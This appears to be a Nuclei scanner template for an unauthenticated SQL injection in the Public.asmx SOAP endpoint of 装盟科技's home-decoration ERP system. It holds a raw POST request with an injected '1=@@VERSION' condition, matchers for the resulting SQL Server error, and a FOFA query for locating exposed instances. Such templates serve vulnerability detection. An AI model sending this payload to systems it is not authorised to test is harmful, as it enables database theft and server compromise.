common/config/pocs/nuclei-2025/装盟科技-家装ERP管理系统-Public.asmx-SQL注入漏洞.yaml

http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - Microsoft SQL Server
            - 转换成数据类型 int 时失败
        - status:
            - 500
          type: status
      matchers-condition: and
      raw:
        - |
          POST /WEB_SERVICE/Public.asmx HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
          Content-Type: text/xml; charset=utf-8
          SOAPAction: "http://tempuri.org/GetDs"

          <?xml version="1.0" encoding="utf-8"?>
          <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
            <soap:Body>
              <GetDs xmlns="http://tempuri.org/">
                <tbName>master.dbo.sysdatabases</tbName>
                <where>1=@@VERSION</where>
              </GetDs>
            </soap:Body>
          </soap:Envelope>
id: jiazhuangERP-Public_asmx-sql
info:
    author: Superhero
    description: |-
        fofa: app="装盟科技-家装ERP管理系统"
        装盟科技-家装ERP管理系统 Public.asmx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 装盟科技-家装ERP管理系统 Public.asmx SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/0KxtSUaPeArp7VpDY8poyg
    severity: high
    tags:
        - PEAR
